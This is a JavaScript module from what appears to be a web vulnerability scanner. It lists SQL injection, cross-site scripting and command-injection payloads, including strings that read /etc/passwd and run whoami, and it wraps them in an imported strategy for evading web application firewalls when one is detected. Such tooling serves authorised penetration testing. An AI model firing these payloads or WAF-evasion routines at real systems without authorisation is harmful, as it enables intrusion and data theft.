/**
 * payloadEngine.js - Centralized Payload Management & Cloaking
 */
const { applyStrategy } = require('./evasion');

const PAYLOAD_TEMPLATES = {
    sqli: [
        "' OR '1'='1",
        "1' AND SLEEP(5)--",
        "1' UNION SELECT NULL,NULL--",
        "admin'--"
    ],
    xss: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ],
    cmd: [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "|| id"
    ]
};

/**
 * Generate a cloaked payload for a specific vulnerability type.
 * @param {string} type - 'sqli', 'xss', or 'cmd'
 * @param {object} scanContext - Current scan context containing WAF info
 */
function generatePayloads(type, scanContext = {}) {
    const basePayloads = PAYLOAD_TEMPLATES[type] || [];
    const waf = scanContext.waf || { detected: false };

    if (!waf.detected || !waf.evasionStrategy) {
        return basePayloads;
    }

    // Apply the working evasion strategy to all payloads
    return basePayloads.map(payload => {
        return applyStrategy(payload, waf.evasionStrategy);
    });
}

module.exports = {
    generatePayloads
};
